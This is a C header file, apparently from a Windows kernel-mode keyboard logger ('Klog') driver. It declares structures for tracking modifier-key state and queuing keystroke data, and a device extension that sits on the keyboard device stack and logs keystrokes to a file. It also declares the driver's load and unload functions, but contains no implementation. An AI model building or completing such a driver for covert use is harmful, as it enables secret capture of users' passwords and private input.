#ifndef _KLOG_H
#define _KLOG_H

#include "kernellib.h"

///////////////////////// 
// STRUCTURES 
//////////////////////// 
typedef struct _KEY_STATE {
	BOOL kSHIFT; //if the shift key is pressed  
	BOOL kCAPSLOCK; //if the caps lock key is pressed down 
	BOOL kCTRL; //if the control key is pressed down 
	BOOL kALT; //if the alt key is pressed down 
}KEY_STATE, *PKEY_STATE;

//Instances of the structure will be chained onto a  
//linked list to keep track of the keyboard data 
//delivered by each irp for a single pressed key 
typedef struct _KEY_DATA {
	LIST_ENTRY ListEntry;
	CHAR KeyData;
	CHAR KeyFlags;
}KEY_DATA, *PKEY_DATA;

typedef struct _DEVICE_EXTENSION {
	PDEVICE_OBJECT pKeyboardDevice; //pointer to next keyboard device on device stack 
	PETHREAD pThreadObj;			//pointer to the worker thread 
	BOOL bThreadTerminate;		    //thread terminiation state 
	HANDLE hLogFile;				//handle to file to log keyboard output 
	KEY_STATE kState;				//state of special keys like CTRL, SHIFT, ect 

	//The work queue of IRP information for the keyboard scan codes is managed by this  
	//linked list, semaphore, and spin lock 
	KSEMAPHORE semQueue;
	KSPIN_LOCK lockQueue;
	LIST_ENTRY QueueListHead;
}DEVICE_EXTENSION, *PDEVICE_EXTENSION;

NTSTATUS Klog_Onload(IN PDRIVER_OBJECT theDriverObject,
	IN PUNICODE_STRING theRegistryPath);
VOID Klog_OnUnload(IN PDRIVER_OBJECT DriverObject);

#endif